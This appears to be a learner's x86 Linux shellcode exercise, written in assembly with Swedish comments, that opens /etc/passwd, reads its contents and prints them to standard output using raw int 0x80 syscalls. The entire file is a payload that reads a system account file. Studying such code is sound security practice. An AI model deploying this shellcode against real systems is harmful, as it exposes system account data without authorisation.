


global _start
section .text
_start:


; open - returerar en FD
    xor eax,eax
    xor ebx,ebx
    mov al,0x5
    push ebx
    push 0x64777373 ; /etc/passwd
    push 0x61702f63 ; /etc/passwd
    push 0x74652f2f ; /etc/passwd
    mov ebx,esp     ; lägg in filen som första argument
    xor eax,eax
    xor ecx,ecx
    mov cl,al       ; tror att det är för att den ska öppnas som readonly
    xor eax,eax
    mov al,0x5
    int 0x80        
    xor ebx,ebx
    mov ebx,eax ; spara filedescriptorn som retureras till ebx


; read
    xor eax,eax
    mov al,0x3      ; syscall-numret
    mov ecx,esp     ; lägg in filnamnet i ecx
    xor edx,edx
    mov dl,0xff
    mov dh,0xff
    int 0x80


; write
    mov edx,eax
    push 0x4
    pop eax
    mov bl,0x1
    int 0x80
    
; exit
    xor eax,eax
    mov al,0x1
    xor ebx,ebx
    mov bl,0x1
    int 0x80
